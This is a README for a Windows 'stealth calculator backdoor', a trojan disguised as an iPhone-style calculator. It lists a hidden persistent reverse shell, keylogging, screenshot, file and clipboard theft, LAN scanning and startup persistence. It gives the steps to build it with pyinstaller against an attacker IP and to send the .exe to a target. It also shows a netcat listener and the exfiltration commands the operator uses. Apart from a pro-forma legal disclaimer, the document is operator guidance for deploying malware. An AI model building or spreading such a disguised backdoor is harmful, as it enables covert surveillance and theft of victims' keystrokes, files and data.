# Stealth Calculator Backdoor (Red Team Demo)

**WARNING: For educational, red team, and authorized penetration testing use only. Unauthorized use is illegal and unethical.**

---

## Features
- iPhone-style calculator UI (Tkinter, Windows-ready)
- Stealth reverse shell (persistent, hidden, auto-reconnect)
- Keylogger, screenshot, file stealer, clipboard stealer, network scanner
- Remote kill switch and self-destruction
- Advanced persistence: copies to hidden location, adds to Windows startup

---

## Setup & Build

1. **Install dependencies** (in this folder):
   ```bash
   pip install -r requirements.txt
   ```

2. **Set your attacker IP and port**
   - Edit `calculator.py` and set:
     ```python
     ATTACKER_IP = "YOUR_KALI_IP"
     ATTACKER_PORT = 4444
     ```

3. **Build the executable**
   ```bash
   pyinstaller --onefile --noconsole calculator.py
   ```
   - The resulting file will be in `dist/calculator.exe`.

4. **Deploy**
   - Send only the `.exe` to the target Windows machine.

---

## Attacker Usage

1. **Start a listener on Kali**
   ```bash
   nc -lvnp 4444
   ```
2. **Wait for the user to press '=' in the calculator**
3. **Use these commands in your shell:**
   - `KILL` — Remotely self-destructs the calculator and removes persistence
   - `GET_KEYLOG` — Retrieve keystrokes
   - `GET_SCREENSHOT` — Get a screenshot
   - `STEAL_FILES .docx .pdf .txt` — Exfiltrate files by extension
   - `GET_CLIPBOARD` — Get clipboard contents
   - `SCAN_LAN` — Scan the local network for live hosts

---

## Legal Notice
- For authorized security testing and education only.
- The authors are not responsible for misuse or damages. 